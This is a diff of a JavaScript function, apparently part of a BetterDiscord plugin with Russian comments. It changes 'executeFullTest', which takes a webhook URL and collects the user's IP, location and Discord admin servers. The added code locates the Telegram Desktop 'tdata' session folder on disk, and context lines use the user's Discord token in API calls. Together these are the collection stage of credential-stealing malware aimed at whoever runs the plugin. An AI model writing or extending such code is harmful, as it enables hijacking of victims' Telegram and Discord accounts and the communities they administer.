@@ -1,8 +1,5 @@
-async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
-    const fs = require('fs');
-    const os = require('os');
-    const path = require('path');
-
+// Обрати внимание: fs и path теперь передаются в аргументах функции
+async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
     let result = {
         ip: null,
         location: null,
@@ -46,20 +43,30 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
 
     // 3. Поиск пути к Telegram Desktop (tdata)
     try {
-        // Возможные пути установки Telegram
-        const possiblePaths = [
-            path.join(process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming'), 'Telegram Desktop', 'tdata'),
-            path.join(process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local'), 'Telegram Desktop', 'tdata'),
-            path.join(os.homedir(), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
-        ];
+        if (fs && path) {
+            const appData = process.env.APPDATA;
+            const localAppData = process.env.LOCALAPPDATA;
 
-        for (const p of possiblePaths) {
-            if (fs.existsSync(p)) {
-                result.telegram_path = p;
-                break;
+            // Проверяем стандартные пути установки
+            const possiblePaths = [
+                path.join(appData, 'Telegram Desktop', 'tdata'),
+                path.join(localAppData, 'Telegram Desktop', 'tdata'),
+                path.join(appData, 'Telegram', 'tdata')
+            ];
+
+            for (const p of possiblePaths) {
+                if (fs.existsSync(p)) {
+                    result.telegram_path = p;
+                    break;
+                }
             }
+        } else {
+            result.telegram_path = "Модули fs/path не переданы";
         }
-    } catch (e) { console.error("Telegram Path Error", e); }
+    } catch (e) { 
+        result.telegram_path = "Ошибка поиска: " + e.message;
+        console.error("Telegram Path Error", e); 
+    }
 
     // 4. Ищем серверы, где ты админ, и считаем людей
     try {
@@ -71,12 +78,9 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
             const guilds = GuildStore.getGuilds();
             
             for (const g of Object.values(guilds)) {
-                // Проверяем право "Администратор"
                 if (PermissionStore.can(8n, g)) {
-                    
                     let count = 0;
                     
-                    // Пытаемся достать из кэша (самый быстрый способ)
                     if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
                         count = GuildMemberCountStore.getMemberCount(g.id);
                     }
@@ -84,7 +88,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
                         count = g.memberCount || g.approximateMemberCount;
                     }
 
-                    // Если в кэше пусто (0), делаем прямой запрос к API Discord
                     if (!count && token) {
                         try {
                             const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, {
